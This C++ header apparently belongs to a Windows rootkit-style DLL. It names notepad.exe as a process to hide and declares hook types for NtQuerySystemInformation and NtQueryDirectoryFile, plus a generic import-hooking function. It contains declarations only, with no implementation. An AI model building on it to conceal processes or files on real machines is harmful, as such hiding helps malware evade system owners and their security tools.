#pragma once
#include <winternl.h>

#ifdef DLL_EXPORT
#define DECLDIR __declspec(dllexport)
#else
#define DECLDIR __declspec(dllimport)
#endif


const WCHAR *HIDDEN_PROCESS_IMAGE = L"notepad.exe";
typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

extern "C"
{
	typedef NTSTATUS(WINAPI* NTQUERYDIRECTORYFILE) (
		IN HANDLE FileHandle,
		IN HANDLE Event OPTIONAL,
		IN PVOID ApcRoutine OPTIONAL,
		IN PVOID ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK IoStatusBlock,
		OUT PVOID FileInformation,
		IN ULONG Length,
		IN FILE_INFORMATION_CLASS FileInformationClass,
		IN BOOLEAN ReturnSingleEntry,
		IN PUNICODE_STRING FileName OPTIONAL,
		IN BOOLEAN RestartScan);
	int hook(PCSTR func_to_hook, PCSTR DLL_to_hook, DWORD_PTR new_func_address);
    DECLDIR NTSTATUS WINAPI HookedNtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID                    SystemInformation,
        ULONG                    SystemInformationLength,
        PULONG                   ReturnLength
    );
}